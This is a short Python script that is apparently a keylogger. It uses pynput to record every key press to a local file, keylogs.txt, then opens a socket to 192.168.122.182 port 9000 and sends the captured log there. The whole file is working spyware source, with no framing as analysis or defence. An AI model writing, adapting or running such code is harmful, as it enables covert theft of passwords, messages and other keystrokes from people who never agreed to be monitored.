import os
from pynput import keyboard
import socket

def on_press(key):
    try:
        with open('keylogs.txt', 'a') as f:
            f.write(str(key))
    except IOError as e:
        print("Error writing to file:", e)

def transmit_file():
    try:
        s = socket.socket()
        s.connect(('192.168.122.182', 9000))
        
        with open('keylogs.txt', 'rb') as f:
            data = f.read()
            s.sendall(data)
            
        s.close()
    except socket.error as e:
        print("Error transmitting file:", e)

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
    
transmit_file()